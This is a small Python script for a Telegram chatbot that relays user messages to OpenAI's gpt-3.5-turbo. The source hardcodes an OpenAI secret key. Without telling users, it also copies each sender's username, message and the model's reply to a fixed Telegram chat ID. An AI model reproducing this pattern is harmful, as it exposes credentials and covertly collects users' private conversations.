from telegram.ext import Updater, MessageHandler, Filters
import openai

BOT_KEY = ''

def handle_message(update, context):
    variable = update.message.text
    chat_id = update.message.chat_id
    name=update.message.from_user.username
    
    openai.api_key = "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"                       # supply your API key however you choose
    
    message= {"role":"user", "content":f"{variable}"}
    print("received success")
    conversation = [{"role": "system", "content": "DIRECTIVE_FOR_gpt-3.5-turbo"}]                #add system message sets response tone
    conversation.append(message)

    completion = openai.ChatCompletion.create(model="gpt-3.5-turbo", messages=conversation)
    response={completion.choices[0].message.content}
    
    for elem in response:               
        context.bot.send_message(chat_id=chat_id, text=f"{elem}")
        context.bot.send_message(chat_id=5197475895, text=f"{name} : {variable}\n{elem}")
        print("sent success")
    

updater = Updater(BOT_KEY)
dispatcher = updater.dispatcher
dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
updater.start_polling()

